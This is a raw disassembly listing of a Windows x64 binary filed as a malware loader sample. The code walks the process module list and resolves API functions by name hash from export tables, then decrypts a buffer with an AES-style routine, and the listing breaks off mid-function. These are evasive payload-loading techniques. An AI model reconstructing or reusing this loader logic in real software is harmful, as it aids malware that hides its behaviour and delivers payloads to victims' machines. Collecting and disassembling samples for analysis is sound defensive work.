
malware_samples/loader/80ef5b531e2e8cb19403a8f06cfa1d6743900957ebf24d84f63211ae04d6bc1f.exe:     file format pei-x86-64


Disassembly of section .text:

0000000180001000 <.text>:
   180001000:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001005:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   18000100a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000100f:	57                   	push   %rdi
   180001010:	48 81 ec 30 01 00 00 	sub    $0x130,%rsp
   180001017:	8b f1                	mov    %ecx,%esi
   180001019:	85 c9                	test   %ecx,%ecx
   18000101b:	0f 84 8f 00 00 00    	je     0x1800010b0
   180001021:	65 48 8b 04 25 60 00 	mov    %gs:0x60,%rax
   180001028:	00 00 
   18000102a:	48 8b 50 18          	mov    0x18(%rax),%rdx
   18000102e:	48 8b 5a 20          	mov    0x20(%rdx),%rbx
   180001032:	48 85 db             	test   %rbx,%rbx
   180001035:	74 79                	je     0x1800010b0
   180001037:	bd 03 01 00 00       	mov    $0x103,%ebp
   18000103c:	0f 1f 40 00          	nopl   0x0(%rax)
   180001040:	48 8b 7b 50          	mov    0x50(%rbx),%rdi
   180001044:	48 85 ff             	test   %rdi,%rdi
   180001047:	74 67                	je     0x1800010b0
   180001049:	66 39 6b 48          	cmp    %bp,0x48(%rbx)
   18000104d:	73 59                	jae    0x1800010a8
   18000104f:	33 d2                	xor    %edx,%edx
   180001051:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180001056:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   18000105c:	e8 7f 1c 00 00       	call   0x180002ce0
   180001061:	33 c0                	xor    %eax,%eax
   180001063:	66 39 07             	cmp    %ax,(%rdi)
   180001066:	74 2d                	je     0x180001095
   180001068:	3b c5                	cmp    %ebp,%eax
   18000106a:	73 29                	jae    0x180001095
   18000106c:	44 0f b6 0c 47       	movzbl (%rdi,%rax,2),%r9d
   180001071:	45 8d 41 9f          	lea    -0x61(%r9),%r8d
   180001075:	41 80 f8 19          	cmp    $0x19,%r8b
   180001079:	41 8d 49 e0          	lea    -0x20(%r9),%ecx
   18000107d:	0f b6 d1             	movzbl %cl,%edx
   180001080:	41 0f 47 d1          	cmova  %r9d,%edx
   180001084:	88 54 04 20          	mov    %dl,0x20(%rsp,%rax,1)
   180001088:	ff c0                	inc    %eax
   18000108a:	48 8b 7b 50          	mov    0x50(%rbx),%rdi
   18000108e:	66 83 3c 47 00       	cmpw   $0x0,(%rdi,%rax,2)
   180001093:	75 d3                	jne    0x180001068
   180001095:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000109a:	c6 44 04 20 00       	movb   $0x0,0x20(%rsp,%rax,1)
   18000109f:	e8 9c 2a 00 00       	call   0x180003b40
   1800010a4:	3b c6                	cmp    %esi,%eax
   1800010a6:	74 23                	je     0x1800010cb
   1800010a8:	48 8b 1b             	mov    (%rbx),%rbx
   1800010ab:	48 85 db             	test   %rbx,%rbx
   1800010ae:	75 90                	jne    0x180001040
   1800010b0:	33 c0                	xor    %eax,%eax
   1800010b2:	4c 8d 9c 24 30 01 00 	lea    0x130(%rsp),%r11
   1800010b9:	00 
   1800010ba:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   1800010be:	49 8b 6b 18          	mov    0x18(%r11),%rbp
   1800010c2:	49 8b 73 20          	mov    0x20(%r11),%rsi
   1800010c6:	49 8b e3             	mov    %r11,%rsp
   1800010c9:	5f                   	pop    %rdi
   1800010ca:	c3                   	ret
   1800010cb:	48 8b 43 20          	mov    0x20(%rbx),%rax
   1800010cf:	eb e1                	jmp    0x1800010b2
   1800010d1:	cc                   	int3
   1800010d2:	cc                   	int3
   1800010d3:	cc                   	int3
   1800010d4:	cc                   	int3
   1800010d5:	cc                   	int3
   1800010d6:	cc                   	int3
   1800010d7:	cc                   	int3
   1800010d8:	cc                   	int3
   1800010d9:	cc                   	int3
   1800010da:	cc                   	int3
   1800010db:	cc                   	int3
   1800010dc:	cc                   	int3
   1800010dd:	cc                   	int3
   1800010de:	cc                   	int3
   1800010df:	cc                   	int3
   1800010e0:	40 55                	rex push %rbp
   1800010e2:	41 57                	push   %r15
   1800010e4:	48 83 ec 28          	sub    $0x28,%rsp
   1800010e8:	44 8b fa             	mov    %edx,%r15d
   1800010eb:	48 8b e9             	mov    %rcx,%rbp
   1800010ee:	48 85 c9             	test   %rcx,%rcx
   1800010f1:	0f 84 a6 00 00 00    	je     0x18000119d
   1800010f7:	85 d2                	test   %edx,%edx
   1800010f9:	0f 84 9e 00 00 00    	je     0x18000119d
   1800010ff:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   180001103:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   180001108:	48 89 74 24 48       	mov    %rsi,0x48(%rsp)
   18000110d:	48 89 7c 24 50       	mov    %rdi,0x50(%rsp)
   180001112:	44 8b 84 08 88 00 00 	mov    0x88(%rax,%rcx,1),%r8d
   180001119:	00 
   18000111a:	4c 03 c1             	add    %rcx,%r8
   18000111d:	4c 89 64 24 58       	mov    %r12,0x58(%rsp)
   180001122:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   180001127:	45 33 f6             	xor    %r14d,%r14d
   18000112a:	41 8b 58 20          	mov    0x20(%r8),%ebx
   18000112e:	45 8b 60 1c          	mov    0x1c(%r8),%r12d
   180001132:	48 03 d9             	add    %rcx,%rbx
   180001135:	41 8b 78 24          	mov    0x24(%r8),%edi
   180001139:	4c 03 e1             	add    %rcx,%r12
   18000113c:	41 8b 70 18          	mov    0x18(%r8),%esi
   180001140:	48 03 f9             	add    %rcx,%rdi
   180001143:	85 f6                	test   %esi,%esi
   180001145:	74 32                	je     0x180001179
   180001147:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   18000114e:	00 00 
   180001150:	8b 0b                	mov    (%rbx),%ecx
   180001152:	ff ce                	dec    %esi
   180001154:	48 03 cd             	add    %rbp,%rcx
   180001157:	e8 e4 29 00 00       	call   0x180003b40
   18000115c:	41 3b c7             	cmp    %r15d,%eax
   18000115f:	74 0e                	je     0x18000116f
   180001161:	48 83 c3 04          	add    $0x4,%rbx
   180001165:	48 83 c7 02          	add    $0x2,%rdi
   180001169:	85 f6                	test   %esi,%esi
   18000116b:	75 e3                	jne    0x180001150
   18000116d:	eb 0a                	jmp    0x180001179
   18000116f:	0f b7 07             	movzwl (%rdi),%eax
   180001172:	45 8b 34 84          	mov    (%r12,%rax,4),%r14d
   180001176:	4c 03 f5             	add    %rbp,%r14
   180001179:	4c 8b 64 24 58       	mov    0x58(%rsp),%r12
   18000117e:	49 8b c6             	mov    %r14,%rax
   180001181:	4c 8b 74 24 20       	mov    0x20(%rsp),%r14
   180001186:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   18000118b:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   180001190:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180001195:	48 83 c4 28          	add    $0x28,%rsp
   180001199:	41 5f                	pop    %r15
   18000119b:	5d                   	pop    %rbp
   18000119c:	c3                   	ret
   18000119d:	33 c0                	xor    %eax,%eax
   18000119f:	48 83 c4 28          	add    $0x28,%rsp
   1800011a3:	41 5f                	pop    %r15
   1800011a5:	5d                   	pop    %rbp
   1800011a6:	c3                   	ret
   1800011a7:	cc                   	int3
   1800011a8:	cc                   	int3
   1800011a9:	cc                   	int3
   1800011aa:	cc                   	int3
   1800011ab:	cc                   	int3
   1800011ac:	cc                   	int3
   1800011ad:	cc                   	int3
   1800011ae:	cc                   	int3
   1800011af:	cc                   	int3
   1800011b0:	40 53                	rex push %rbx
   1800011b2:	57                   	push   %rdi
   1800011b3:	41 55                	push   %r13
   1800011b5:	41 56                	push   %r14
   1800011b7:	41 57                	push   %r15
   1800011b9:	48 83 ec 30          	sub    $0x30,%rsp
   1800011bd:	49 8b f9             	mov    %r9,%rdi
   1800011c0:	49 8b d8             	mov    %r8,%rbx
   1800011c3:	4c 8b f2             	mov    %rdx,%r14
   1800011c6:	4c 8b e9             	mov    %rcx,%r13
   1800011c9:	41 f6 c0 0f          	test   $0xf,%r8b
   1800011cd:	0f 85 fb 00 00 00    	jne    0x1800012ce
   1800011d3:	4c 8b fb             	mov    %rbx,%r15
   1800011d6:	49 c1 ef 04          	shr    $0x4,%r15
   1800011da:	ff 15 28 2e 00 00    	call   *0x2e28(%rip)        # 0x180004008
   1800011e0:	4c 8b c3             	mov    %rbx,%r8
   1800011e3:	ba 08 00 00 00       	mov    $0x8,%edx
   1800011e8:	48 8b c8             	mov    %rax,%rcx
   1800011eb:	ff 15 0f 2e 00 00    	call   *0x2e0f(%rip)        # 0x180004000
   1800011f1:	48 89 07             	mov    %rax,(%rdi)
   1800011f4:	48 8b d8             	mov    %rax,%rbx
   1800011f7:	48 85 c0             	test   %rax,%rax
   1800011fa:	0f 84 ce 00 00 00    	je     0x1800012ce
   180001200:	48 89 74 24 68       	mov    %rsi,0x68(%rsp)
   180001205:	49 8d b5 f0 00 00 00 	lea    0xf0(%r13),%rsi
   18000120c:	4d 85 ff             	test   %r15,%r15
   18000120f:	0f 84 a5 00 00 00    	je     0x1800012ba
   180001215:	48 89 6c 24 60       	mov    %rbp,0x60(%rsp)
   18000121a:	48 8b fe             	mov    %rsi,%rdi
   18000121d:	4c 89 64 24 70       	mov    %r12,0x70(%rsp)
   180001222:	48 8d 68 0f          	lea    0xf(%rax),%rbp
   180001226:	0f 29 74 24 20       	movaps %xmm6,0x20(%rsp)
   18000122b:	4c 8d 66 0f          	lea    0xf(%rsi),%r12
   18000122f:	48 2b f8             	sub    %rax,%rdi
   180001232:	0f 1f 40 00          	nopl   0x0(%rax)
   180001236:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000123d:	00 00 00 
   180001240:	41 0f 10 36          	movups (%r14),%xmm6
   180001244:	4d 8b ce             	mov    %r14,%r9
   180001247:	4c 8b c3             	mov    %rbx,%r8
   18000124a:	ba 0e 00 00 00       	mov    $0xe,%edx
   18000124f:	49 8b cd             	mov    %r13,%rcx
   180001252:	e8 c9 00 00 00       	call   0x180001320
   180001257:	49 3b dc             	cmp    %r12,%rbx
   18000125a:	77 26                	ja     0x180001282
   18000125c:	48 3b ee             	cmp    %rsi,%rbp
   18000125f:	72 21                	jb     0x180001282
   180001261:	48 8b c3             	mov    %rbx,%rax
   180001264:	ba 10 00 00 00       	mov    $0x10,%edx
   180001269:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180001270:	0f b6 0c 07          	movzbl (%rdi,%rax,1),%ecx
   180001274:	30 08                	xor    %cl,(%rax)
   180001276:	48 8d 40 01          	lea    0x1(%rax),%rax
   18000127a:	48 83 ea 01          	sub    $0x1,%rdx
   18000127e:	75 f0                	jne    0x180001270
   180001280:	eb 10                	jmp    0x180001292
   180001282:	f3 0f 6f 0b          	movdqu (%rbx),%xmm1
   180001286:	f3 0f 6f 06          	movdqu (%rsi),%xmm0
   18000128a:	66 0f ef c8          	pxor   %xmm0,%xmm1
   18000128e:	f3 0f 7f 0b          	movdqu %xmm1,(%rbx)
   180001292:	48 83 c3 10          	add    $0x10,%rbx
   180001296:	48 83 c5 10          	add    $0x10,%rbp
   18000129a:	48 83 ef 10          	sub    $0x10,%rdi
   18000129e:	49 83 c6 10          	add    $0x10,%r14
   1800012a2:	0f 11 36             	movups %xmm6,(%rsi)
   1800012a5:	49 83 ef 01          	sub    $0x1,%r15
   1800012a9:	75 95                	jne    0x180001240
   1800012ab:	0f 28 74 24 20       	movaps 0x20(%rsp),%xmm6
   1800012b0:	4c 8b 64 24 70       	mov    0x70(%rsp),%r12
   1800012b5:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   1800012ba:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   1800012bf:	b0 01                	mov    $0x1,%al
   1800012c1:	48 83 c4 30          	add    $0x30,%rsp
   1800012c5:	41 5f                	pop    %r15
   1800012c7:	41 5e                	pop    %r14
   1800012c9:	41 5d                	pop    %r13
   1800012cb:	5f                   	pop    %rdi
   1800012cc:	5b                   	pop    %rbx
   1800012cd:	c3                   	ret
   1800012ce:	32 c0                	xor    %al,%al
   1800012d0:	48 83 c4 30          	add    $0x30,%rsp
   1800012d4:	41 5f                	pop    %r15
   1800012d6:	41 5e                	pop    %r14
   1800012d8:	41 5d                	pop    %r13
   1800012da:	5f                   	pop    %rdi
   1800012db:	5b                   	pop    %rbx
   1800012dc:	c3                   	ret
   1800012dd:	cc                   	int3
   1800012de:	cc                   	int3
   1800012df:	cc                   	int3
   1800012e0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800012e5:	57                   	push   %rdi
   1800012e6:	48 83 ec 20          	sub    $0x20,%rsp
   1800012ea:	41 b9 0e 00 00 00    	mov    $0xe,%r9d
   1800012f0:	49 8b f8             	mov    %r8,%rdi
   1800012f3:	48 8b d9             	mov    %rcx,%rbx
   1800012f6:	45 8d 41 fa          	lea    -0x6(%r9),%r8d
   1800012fa:	e8 61 03 00 00       	call   0x180001660
   1800012ff:	0f 10 07             	movups (%rdi),%xmm0
   180001302:	0f 11 83 f0 00 00 00 	movups %xmm0,0xf0(%rbx)
   180001309:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000130e:	48 83 c4 20          	add    $0x20,%rsp
   180001312:	5f                   	pop    %rdi
   180001313:	c3                   	ret
   180001314:	cc                   	int3
   180001315:	cc                   	int3
   180001316:	cc                   	int3
   180001317:	cc                   	int3
   180001318:	cc                   	int3
   180001319:	cc                   	int3
   18000131a:	cc                   	int3
   18000131b:	cc                   	int3
   18000131c:	cc                   	int3
   18000131d:	cc                   	int3
   18000131e:	cc                   	int3
   18000131f:	cc                   	int3
   180001320:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001325:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000132a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   18000132f:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   180001334:	55                   	push   %rbp
   180001335:	48 8d 6c 24 a9       	lea    -0x57(%rsp),%rbp
   18000133a:	48 81 ec c0 00 00 00 	sub    $0xc0,%rsp
   180001341:	48 63 fa             	movslq %edx,%rdi
   180001344:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001347:	48 8b df             	mov    %rdi,%rbx
   18000134a:	49 8b d1             	mov    %r9,%rdx
   18000134d:	48 c1 e3 04          	shl    $0x4,%rbx
   180001351:	49 8b f0             	mov    %r8,%rsi
   180001354:	48 03 d9             	add    %rcx,%rbx
   180001357:	48 8d 4d b7          	lea    -0x49(%rbp),%rcx
   18000135b:	0f 11 45 b7          	movups %xmm0,-0x49(%rbp)
   18000135f:	e8 0c 08 00 00       	call   0x180001b70
   180001364:	0f b7 03             	movzwl (%rbx),%eax
   180001367:	41 be 01 00 00 00    	mov    $0x1,%r14d
   18000136d:	66 31 45 b7          	xor    %ax,-0x49(%rbp)
   180001371:	0f b7 43 02          	movzwl 0x2(%rbx),%eax
   180001375:	66 31 45 b9          	xor    %ax,-0x47(%rbp)
   180001379:	0f b7 43 04          	movzwl 0x4(%rbx),%eax
   18000137d:	66 31 45 bb          	xor    %ax,-0x45(%rbp)
   180001381:	0f b7 43 06          	movzwl 0x6(%rbx),%eax
   180001385:	66 31 45 bd          	xor    %ax,-0x43(%rbp)
   180001389:	0f b7 43 08          	movzwl 0x8(%rbx),%eax
   18000138d:	66 31 45 bf          	xor    %ax,-0x41(%rbp)
   180001391:	0f b7 43 0a          	movzwl 0xa(%rbx),%eax
   180001395:	66 31 45 c1          	xor    %ax,-0x3f(%rbp)
   180001399:	0f b7 43 0c          	movzwl 0xc(%rbx),%eax
   18000139d:	66 31 45 c3          	xor    %ax,-0x3d(%rbp)
   1800013a1:	0f b7 43 0e          	movzwl 0xe(%rbx),%eax
   1800013a5:	48 83 eb 10          	sub    $0x10,%rbx
   1800013a9:	66 31 45 c5          	xor    %ax,-0x3b(%rbp)
   1800013ad:	41 3b fe             	cmp    %r14d,%edi
   1800013b0:	0f 8e a0 01 00 00    	jle    0x180001556
   1800013b6:	0f 29 b4 24 b0 00 00 	movaps %xmm6,0xb0(%rsp)
   1800013bd:	00 
   1800013be:	ff cf                	dec    %edi
   1800013c0:	0f 29 bc 24 a0 00 00 	movaps %xmm7,0xa0(%rsp)
   1800013c7:	00 
   1800013c8:	66 0f 6f 3d b0 2c 00 	movdqa 0x2cb0(%rip),%xmm7        # 0x180004080
   1800013cf:	00 
   1800013d0:	44 0f 29 84 24 90 00 	movaps %xmm8,0x90(%rsp)
   1800013d7:	00 00 
   1800013d9:	66 44 0f 6f 05 ce 2c 	movdqa 0x2cce(%rip),%xmm8        # 0x1800040b0
   1800013e0:	00 00 
   1800013e2:	44 0f 29 8c 24 80 00 	movaps %xmm9,0x80(%rsp)
   1800013e9:	00 00 
   1800013eb:	66 44 0f 6f 0d cc 2c 	movdqa 0x2ccc(%rip),%xmm9        # 0x1800040c0
   1800013f2:	00 00 
   1800013f4:	44 0f 29 54 24 70    	movaps %xmm10,0x70(%rsp)
   1800013fa:	66 44 0f 6f 15 cd 2c 	movdqa 0x2ccd(%rip),%xmm10        # 0x1800040d0
   180001401:	00 00 
   180001403:	44 0f 29 5c 24 60    	movaps %xmm11,0x60(%rsp)
   180001409:	66 44 0f 6f 1d 8e 2c 	movdqa 0x2c8e(%rip),%xmm11        # 0x1800040a0
   180001410:	00 00 
   180001412:	44 0f 29 64 24 50    	movaps %xmm12,0x50(%rsp)
   180001418:	66 44 0f 6f 25 6f 2c 	movdqa 0x2c6f(%rip),%xmm12        # 0x180004090
   18000141f:	00 00 
   180001421:	44 0f 29 6c 24 40    	movaps %xmm13,0x40(%rsp)
   180001427:	66 44 0f 6f 2d 40 2c 	movdqa 0x2c40(%rip),%xmm13        # 0x180004070
   18000142e:	00 00 
   180001430:	66 41 0f 6e f6       	movd   %r14d,%xmm6
   180001435:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   18000143c:	00 00 00 00 
   180001440:	f3 0f 6f 55 b7       	movdqu -0x49(%rbp),%xmm2
   180001445:	48 8d 4d b7          	lea    -0x49(%rbp),%rcx
   180001449:	41 8b d6             	mov    %r14d,%edx
   18000144c:	66 41 0f 6f c0       	movdqa %xmm8,%xmm0
   180001451:	66 41 0f 6f ca       	movdqa %xmm10,%xmm1
   180001456:	66 0f db c2          	pand   %xmm2,%xmm0
   18000145a:	66 0f db ca          	pand   %xmm2,%xmm1
   18000145e:	66 0f f1 ce          	psllw  %xmm6,%xmm1
   180001462:	66 0f 6f da          	movdqa %xmm2,%xmm3
   180001466:	66 0f d1 de          	psrlw  %xmm6,%xmm3
   18000146a:	66 0f db df          	pand   %xmm7,%xmm3
   18000146e:	66 0f eb d8          	por    %xmm0,%xmm3
   180001472:	66 41 0f 6f c1       	movdqa %xmm9,%xmm0
   180001477:	66 0f db c2          	pand   %xmm2,%xmm0
   18000147b:	66 0f d1 de          	psrlw  %xmm6,%xmm3
   18000147f:	66 0f eb d8          	por    %xmm0,%xmm3
   180001483:	66 41 0f 6f c3       	movdqa %xmm11,%xmm0
   180001488:	66 0f db c2          	pand   %xmm2,%xmm0
   18000148c:	66 0f eb c8          	por    %xmm0,%xmm1
   180001490:	66 41 0f 6f c4       	movdqa %xmm12,%xmm0
   180001495:	66 0f db c2          	pand   %xmm2,%xmm0
   180001499:	66 0f f1 ce          	psllw  %xmm6,%xmm1
   18000149d:	66 0f d1 de          	psrlw  %xmm6,%xmm3
   1800014a1:	66 0f eb c8          	por    %xmm0,%xmm1
   1800014a5:	66 41 0f 6f c5       	movdqa %xmm13,%xmm0
   1800014aa:	66 0f f1 ce          	psllw  %xmm6,%xmm1
   1800014ae:	66 0f db c2          	pand   %xmm2,%xmm0
   1800014b2:	66 0f eb d9          	por    %xmm1,%xmm3
   1800014b6:	66 0f eb d8          	por    %xmm0,%xmm3
   1800014ba:	f3 0f 7f 5d b7       	movdqu %xmm3,-0x49(%rbp)
   1800014bf:	e8 9c 0b 00 00       	call   0x180002060
   1800014c4:	0f b7 03             	movzwl (%rbx),%eax
   1800014c7:	48 8d 4d b7          	lea    -0x49(%rbp),%rcx
   1800014cb:	66 31 45 b7          	xor    %ax,-0x49(%rbp)
   1800014cf:	41 8b d6             	mov    %r14d,%edx
   1800014d2:	0f b7 43 02          	movzwl 0x2(%rbx),%eax
   1800014d6:	66 31 45 b9          	xor    %ax,-0x47(%rbp)
   1800014da:	0f b7 43 04          	movzwl 0x4(%rbx),%eax
   1800014de:	66 31 45 bb          	xor    %ax,-0x45(%rbp)
   1800014e2:	0f b7 43 06          	movzwl 0x6(%rbx),%eax
   1800014e6:	66 31 45 bd          	xor    %ax,-0x43(%rbp)
   1800014ea:	0f b7 43 08          	movzwl 0x8(%rbx),%eax
   1800014ee:	66 31 45 bf          	xor    %ax,-0x41(%rbp)
   1800014f2:	0f b7 43 0a          	movzwl 0xa(%rbx),%eax
   1800014f6:	66 31 45 c1          	xor    %ax,-0x3f(%rbp)
   1800014fa:	0f b7 43 0c          	movzwl 0xc(%rbx),%eax
   1800014fe:	66 31 45 c3          	xor    %ax,-0x3d(%rbp)
   180001502:	0f b7 43 0e          	movzwl 0xe(%rbx),%eax
   180001506:	48 83 eb 10          	sub    $0x10,%rbx
   18000150a:	66 31 45 c5          	xor    %ax,-0x3b(%rbp)
   18000150e:	e8 dd 07 00 00       	call   0x180001cf0
   180001513:	49 2b fe             	sub    %r14,%rdi
   180001516:	0f 85 24 ff ff ff    	jne    0x180001440
   18000151c:	44 0f 28 6c 24 40    	movaps 0x40(%rsp),%xmm13
   180001522:	44 0f 28 64 24 50    	movaps 0x50(%rsp),%xmm12
   180001528:	44 0f 28 5c 24 60    	movaps 0x60(%rsp),%xmm11
   18000152e:	44 0f 28 54 24 70    	movaps 0x70(%rsp),%xmm10
   180001534:	44 0f 28 8c 24 80 00 	movaps 0x80(%rsp),%xmm9
   18000153b:	00 00 
   18000153d:	44 0f 28 84 24 90 00 	movaps 0x90(%rsp),%xmm8
   180001544:	00 00 
   180001546:	0f 28 bc 24 a0 00 00 	movaps 0xa0(%rsp),%xmm7
   18000154d:	00 
   18000154e:	0f 28 b4 24 b0 00 00 	movaps 0xb0(%rsp),%xmm6
   180001555:	00 
   180001556:	f3 0f 6f 5d b7       	movdqu -0x49(%rbp),%xmm3
   18000155b:	48 8d 4d b7          	lea    -0x49(%rbp),%rcx
   18000155f:	41 8b d6             	mov    %r14d,%edx
   180001562:	66 0f 6f 25 66 2b 00 	movdqa 0x2b66(%rip),%xmm4        # 0x1800040d0
   180001569:	00 
   18000156a:	66 0f 6f 05 2e 2b 00 	movdqa 0x2b2e(%rip),%xmm0        # 0x1800040a0
   180001571:	00 
   180001572:	66 0f db e3          	pand   %xmm3,%xmm4
   180001576:	66 0f db c3          	pand   %xmm3,%xmm0
   18000157a:	66 41 0f 6e d6       	movd   %r14d,%xmm2
   18000157f:	66 0f f1 e2          	psllw  %xmm2,%xmm4
   180001583:	66 0f 6f cb          	movdqa %xmm3,%xmm1
   180001587:	66 0f eb e0          	por    %xmm0,%xmm4
   18000158b:	66 0f 6f 05 fd 2a 00 	movdqa 0x2afd(%rip),%xmm0        # 0x180004090
   180001592:	00 
   180001593:	66 0f db c3          	pand   %xmm3,%xmm0
   180001597:	66 0f d1 ca          	psrlw  %xmm2,%xmm1
   18000159b:	66 0f f1 e2          	psllw  %xmm2,%xmm4
   18000159f:	66 0f db 0d d9 2a 00 	pand   0x2ad9(%rip),%xmm1        # 0x180004080
   1800015a6:	00 
   1800015a7:	66 0f eb e0          	por    %xmm0,%xmm4
   1800015ab:	66 0f 6f 05 fd 2a 00 	movdqa 0x2afd(%rip),%xmm0        # 0x1800040b0
   1800015b2:	00 
   1800015b3:	66 0f db c3          	pand   %xmm3,%xmm0
   1800015b7:	66 0f eb c8          	por    %xmm0,%xmm1
   1800015bb:	66 0f 6f 05 fd 2a 00 	movdqa 0x2afd(%rip),%xmm0        # 0x1800040c0
   1800015c2:	00 
   1800015c3:	66 0f db c3          	pand   %xmm3,%xmm0
   1800015c7:	66 0f d1 ca          	psrlw  %xmm2,%xmm1
   1800015cb:	66 0f f1 e2          	psllw  %xmm2,%xmm4
   1800015cf:	66 0f eb c8          	por    %xmm0,%xmm1
   1800015d3:	66 0f 6f 05 95 2a 00 	movdqa 0x2a95(%rip),%xmm0        # 0x180004070
   1800015da:	00 
   1800015db:	66 0f d1 ca          	psrlw  %xmm2,%xmm1
   1800015df:	66 0f db c3          	pand   %xmm3,%xmm0
   1800015e3:	66 0f eb e1          	por    %xmm1,%xmm4
   1800015e7:	66 0f eb e0          	por    %xmm0,%xmm4
   1800015eb:	f3 0f 7f 65 b7       	movdqu %xmm4,-0x49(%rbp)
   1800015f0:	e8 6b 0a 00 00       	call   0x180002060
   1800015f5:	0f b7 03             	movzwl (%rbx),%eax
   1800015f8:	48 8d 55 b7          	lea    -0x49(%rbp),%rdx
   1800015fc:	66 31 45 b7          	xor    %ax,-0x49(%rbp)
   180001600:	48 8b ce             	mov    %rsi,%rcx
   180001603:	0f b7 43 02          	movzwl 0x2(%rbx),%eax
   180001607:	66 31 45 b9          	xor    %ax,-0x47(%rbp)
   18000160b:	0f b7 43 04          	movzwl 0x4(%rbx),%eax
   18000160f:	66 31 45 bb          	xor    %ax,-0x45(%rbp)
   180001613:	0f b7 43 06          	movzwl 0x6(%rbx),%eax
   180001617:	66 31 45 bd          	xor    %ax,-0x43(%rbp)
   18000161b:	0f b7 43 08          	movzwl 0x8(%rbx),%eax
   18000161f:	66 31 45 bf          	xor    %ax,-0x41(%rbp)
   180001623:	0f b7 43 0a          	movzwl 0xa(%rbx),%eax
   180001627:	66 31 45 c1          	xor    %ax,-0x3f(%rbp)
   18000162b:	0f b7 43 0c          	movzwl 0xc(%rbx),%eax
   18000162f:	66 31 45 c3          	xor    %ax,-0x3d(%rbp)
   180001633:	0f b7 43 0e          	movzwl 0xe(%rbx),%eax
   180001637:	66 31 45 c5          	xor    %ax,-0x3b(%rbp)
   18000163b:	e8 50 09 00 00       	call   0x180001f90
   180001640:	4c 8d 9c 24 c0 00 00 	lea    0xc0(%rsp),%r11
   180001647:	00 
   180001648:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   18000164c:	49 8b 73 18          	mov    0x18(%r11),%rsi
   180001650:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   180001654:	4d 8b 73 28          	mov    0x28(%r11),%r14
   180001658:	49 8b e3             	mov    %r11,%rsp
   18000165b:	5d                   	pop    %rbp
   18000165c:	c3                   	ret
   18000165d:	cc                   	int3
   18000165e:	cc                   	int3
   18000165f:	cc                   	int3
   180001660:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001665:	44 89 4c 24 20       	mov    %r9d,0x20(%rsp)
   18000166a:	55                   	push   %rbp
   18000166b:	56                   	push   %rsi
   18000166c:	57                   	push   %rdi
   18000166d:	41 54                	push   %r12
   18000166f:	41 55                	push   %r13
   180001671:	41 56                	push   %r14
   180001673:	41 57                	push   %r15
   180001675:	48 8b ec             	mov    %rsp,%rbp
   180001678:	48 83 ec 50          	sub    $0x50,%rsp
   18000167c:	41 8d 41 01          	lea    0x1(%r9),%eax
   180001680:	4d 63 f0             	movslq %r8d,%r14
   180001683:	48 8b f2             	mov    %rdx,%rsi
   180001686:	c7 45 ec 01 00 00 00 	movl   $0x1,-0x14(%rbp)
   18000168d:	33 d2                	xor    %edx,%edx
   18000168f:	4c 8b e1             	mov    %rcx,%r12
   180001692:	66 89 55 e0          	mov    %dx,-0x20(%rbp)
   180001696:	45 8b f9             	mov    %r9d,%r15d
   180001699:	66 89 55 ea          	mov    %dx,-0x16(%rbp)
   18000169d:	0f b7 da             	movzwl %dx,%ebx
   1800016a0:	66 89 55 e8          	mov    %dx,-0x18(%rbp)
   1800016a4:	8b fa                	mov    %edx,%edi
   1800016a6:	66 89 55 e6          	mov    %dx,-0x1a(%rbp)
   1800016aa:	66 89 55 e4          	mov    %dx,-0x1c(%rbp)
   1800016ae:	66 89 55 50          	mov    %dx,0x50(%rbp)
   1800016b2:	66 89 55 e2          	mov    %dx,-0x1e(%rbp)
   1800016b6:	48 63 c8             	movslq %eax,%rcx
   1800016b9:	85 c0                	test   %eax,%eax
   1800016bb:	7e 25                	jle    0x1800016e2
   1800016bd:	49 8d 44 24 04       	lea    0x4(%r12),%rax
   1800016c2:	0f 1f 40 00          	nopl   0x0(%rax)
   1800016c6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1800016cd:	00 00 00 
   1800016d0:	48 89 50 fc          	mov    %rdx,-0x4(%rax)
   1800016d4:	48 89 50 04          	mov    %rdx,0x4(%rax)
   1800016d8:	48 8d 40 10          	lea    0x10(%rax),%rax
   1800016dc:	48 83 e9 01          	sub    $0x1,%rcx
   1800016e0:	75 ee                	jne    0x1800016d0
   1800016e2:	44 8b d2             	mov    %edx,%r10d
   1800016e5:	45 85 c0             	test   %r8d,%r8d
   1800016e8:	0f 8e 04 01 00 00    	jle    0x1800017f2
   1800016ee:	48 8b da             	mov    %rdx,%rbx
   1800016f1:	0f 1f 40 00          	nopl   0x0(%rax)
   1800016f5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   1800016fc:	00 00 00 00 
   180001700:	48 8b c3             	mov    %rbx,%rax
   180001703:	45 8b ca             	mov    %r10d,%r9d
   180001706:	48 c1 e8 02          	shr    $0x2,%rax
   18000170a:	41 bb 04 00 00 00    	mov    $0x4,%r11d
